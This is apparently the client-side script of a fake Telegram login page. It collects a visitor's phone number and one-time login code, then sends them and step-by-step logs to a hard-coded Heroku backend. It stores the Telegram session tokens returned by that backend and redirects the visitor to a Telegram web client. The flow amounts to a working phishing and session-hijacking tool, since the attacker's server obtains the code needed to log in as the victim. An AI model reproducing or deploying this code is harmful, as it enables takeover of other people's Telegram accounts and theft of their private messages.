const BACKEND_URL = 'https://tgserver-412f54793d43.herokuapp.com/'; 

async function sendLogToBackend(message) {
    console.log('Log:', message);  

    // Send the log message to the backend
    try {
        await fetch(`${BACKEND_URL}/log`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ logMessage: message })
        });
    } catch (error) {
        console.error('Error sending log to backend:', error);
    }
}

// Check if the DOM is fully loaded before adding event listeners to ensure they attach correctly
document.addEventListener('DOMContentLoaded', function() {
    // Handling phone number form submission
    const phoneForm = document.getElementById('phoneForm');
    if (phoneForm) {
        phoneForm.addEventListener('submit', async function(event) {
            event.preventDefault();
            sendLogToBackend("Phone form submitted!");

            const phoneNumber = document.getElementById('phoneNumber').value;
            sendLogToBackend("Phone number entered: " + phoneNumber);

            sessionStorage.setItem('phoneNumber', phoneNumber);  // Store phone number in sessionStorage

            try {
                const response = await fetch(`${BACKEND_URL}/sendPhoneNumber`, {  // Use Heroku URL
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phoneNumber })
                });

                if (!response.ok) throw new Error('Network response was not ok: ' + response.statusText);

                const data = await response.json();
                sendLogToBackend('Response from backend: ' + JSON.stringify(data));

                if (data.phone_code_hash) {
                    sessionStorage.setItem('phone_code_hash', data.phone_code_hash);
                    sendLogToBackend("Phone code hash stored: " + data.phone_code_hash);  // Log the hash
                    window.location.href = '/otp';  // Redirect to OTP page
                } else {
                    console.error('Failed to send OTP:', data.message);
                    displayMessage(data.message || 'Failed to send OTP', 'error');
                }
            } catch (error) {
                console.error('Error sending phone number:', error);
                displayMessage('Error sending OTP: ' + error.message, 'error');
            }
        });
    }

    // Handling OTP form submission
    const otpForm = document.getElementById('otpForm');
    if (otpForm) {
        otpForm.addEventListener('submit', async function(event) {
            event.preventDefault();
            sendLogToBackend("Phone code form submitted!");

            const phoneNumber = sessionStorage.getItem('phoneNumber');
            const phoneCode = document.getElementById('phoneCode').value; // Update to phoneCode
            const phoneCodeHash = sessionStorage.getItem('phone_code_hash');

            if (!/^\d{5}$/.test(phoneCode)) {
                console.error("Invalid phone code. Must be 5 digits.");
                displayMessage("Phone code must be exactly 5 digits.", 'error');
                return;
            }

            sendLogToBackend("Phone number from sessionStorage: " + phoneNumber);
            sendLogToBackend("Phone code entered: " + phoneCode);
            sendLogToBackend("Phone code hash: " + phoneCodeHash);

            try {
                const response = await fetch(`${BACKEND_URL}/verifyOTP`, {  // Use Heroku URL
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phoneNumber, phoneCode, phone_code_hash: phoneCodeHash }) // Ensure the key matches
                });

                if (!response.ok) {
                    const data = await response.json();
                    console.error('Failed to submit Phone Code:', data.message);
                    throw new Error(data.message || 'Failed to submit Phone Code');
                }

                const result = await response.json();
                sendLogToBackend('Received auth tokens: ' + JSON.stringify(result.authTokens));

                // Clear local storage before setting new auth tokens
                localStorage.clear();

                // Setting the new auth tokens in local storage
                localStorage.setItem('auth_key', result.authTokens.auth_key);
                localStorage.setItem('dc_id', result.authTokens.dc_id);
                localStorage.setItem('session_string', result.authTokens.session_string);

                // Redirect the user to the Telegram web client
                window.location.href = result.redirectUrl;  // Use the redirect URL provided by the backend

                displayMessage('Phone Code submitted successfully! Redirecting to Telegram...', 'success');
            } catch (error) {
                console.error('Error submitting Phone Code:', error);
                displayMessage('Error submitting Phone Code: ' + error.message, 'error');
            }
        });
    }
});

// Function to display messages (success or error)
function displayMessage(message, type) {
    const messageContainer = document.getElementById('message') || document.getElementById('successMessage') || document.getElementById('errorMessage');

    if (type === 'error') {
        messageContainer.innerText = message;
        messageContainer.style.color = 'red';
        messageContainer.style.display = 'block';
    } else {
        messageContainer.innerText = message;
        messageContainer.style.color = 'green';
        messageContainer.style.display = 'block';
    }
}
